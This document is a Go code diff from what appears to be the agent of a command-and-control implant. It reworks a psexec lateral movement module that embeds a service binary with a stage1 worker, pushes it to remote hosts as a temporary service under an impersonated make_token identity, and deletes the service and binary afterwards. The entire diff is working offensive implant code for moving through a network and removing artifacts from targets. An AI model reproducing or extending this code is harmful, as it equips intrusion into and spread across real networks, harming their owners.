@@ -14,13 +14,14 @@ import (
 	"time"
 )
 
-// embeddedStage1 carries the compact stage1 launcher binary inside this
-// agent, the way RemCom embeds its service and extracts it at runtime.
-// The placeholder is replaced by the real launcher when the server builds
-// the agent (see build_go_agent in server_rmm.py).
+// embeddedLateralService carries the dedicated lateral service host with
+// its linked stage1 worker inside this agent, the way RemCom embeds its
+// service and extracts it at runtime. The placeholder is replaced by the
+// real service host when the server builds the agent (see build_go_agent
+// in server_rmm.py).
 //
-//go:embed stage1.bin
-var embeddedStage1 []byte
+//go:embed lateral-service.bin
+var embeddedLateralService []byte
 
 // lateralPayload carries the lateral movement request as a JSON body on the
 // __LATERAL__ beacon command, mirroring __MAKE_TOKEN__.
@@ -43,6 +44,31 @@ var lateralMethods = map[string]bool{
 // The staged binary name becomes part of the service binPath, so it must be a
 // simple filename without spaces or separators.
 var lateralRemoteNamePattern = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,63}\.exe$`)
+
+type lateralResult struct {
+	result string
+	err    error
+}
+
+// awaitLateralResult preserves acknowledged artifacts when the command expires.
+func awaitLateralResult(ctx context.Context, results <-chan lateralResult, progress <-chan string) (string, error) {
+	select {
+	case r := <-results:
+		return r.result, r.err
+	case <-ctx.Done():
+		select {
+		case r := <-results:
+			return r.result, r.err
+		default:
+		}
+		select {
+		case ack := <-progress:
+			return ack + "\nlateral cleanup pending: command deadline exceeded; worker may still be running", nil
+		default:
+			return "", errors.New("lateral psexec timed out; the target may still be starting")
+		}
+	}
+}
 
 func parseLateralPayload(command string) (lateralPayload, error) {
 	var payload lateralPayload
@@ -72,8 +98,9 @@ func parseLateralPayload(command string) (lateralPayload, error) {
 		return payload, errors.New("host is required")
 	}
 	if payload.Method == "psexec" {
-		// The psexec module pushes the embedded stage1 launcher, whose only
-		// capability is the staging reference created by the listener.
+		// The psexec module pushes the dedicated lateral service host,
+		// whose only capability is the staging reference created by the
+		// listener.
 		if !agentSessionIDPattern.MatchString(payload.Stage) {
 			return payload, errors.New("psexec requires a staging reference from the listener")
 		}
@@ -117,7 +144,6 @@ func lateralCommand(command string) (string, error) {
 		if err != nil {
 			return "", err
 		}
-		rememberLateralCleanup(payload, result)
 		return result, nil
 	}
 
@@ -151,7 +177,7 @@ func lateralCommand(command string) (string, error) {
 }
 
 // lateralCleanupPayload identifies the deployment artifacts a psexec move
-// left on the target: the temporary service and the stage1 launcher binary.
+// left on the target: the temporary service and its host binary.
 type lateralCleanupPayload struct {
 	Host        string `json:"host"`
 	ServiceName string `json:"service_name"`
@@ -173,6 +199,14 @@ func rememberLateralCleanup(request lateralPayload, result string) {
 	if request.Method != "psexec" || request.SessionID == "" {
 		return
 	}
+	first, remainder, _ := strings.Cut(result, "\n")
+	if strings.HasPrefix(remainder, "lateral cleanup: ") {
+		return
+	}
+	if remainder != "" && (!strings.HasPrefix(remainder, "lateral cleanup pending: ") || strings.Contains(remainder, "\n")) {
+		return
+	}
+	result = first
 	prefix := fmt.Sprintf("lateral started: method=psexec host=%s target session=%s ", request.Host, request.SessionID)
 	if !strings.HasPrefix(result, prefix) {
 		return
@@ -216,11 +250,13 @@ func parseLateralCleanupPayload(command string) (lateralCleanupPayload, error) {
 	return payload, nil
 }
 
-// lateralCleanupCommand handles __LATERAL_CLEANUP__ after a psexec move: it
-// runs in a bounded child (with the active make_token identity through
-// applyCommandToken) that deletes the temporary launcher service and the
-// stage1 binary on the target once the agent is running. reestablishThreadToken
-// is called after the child exits for the same reason as in lateralCommand.
+// lateralCleanupCommand handles __LATERAL_CLEANUP__, the server-side retry
+// after a psexec move whose immediate caller-side cleanup stayed pending:
+// it runs in a bounded child (with the active make_token identity through
+// applyCommandToken) that waits for the launcher service to finish, then
+// deletes the temporary service and its host binary on the target.
+// reestablishThreadToken is called after the child exits for the same
+// reason as in lateralCommand.
 func lateralCleanupCommand(command string) (string, error) {
 	payload, err := parseLateralCleanupPayload(command)
 	if err != nil {
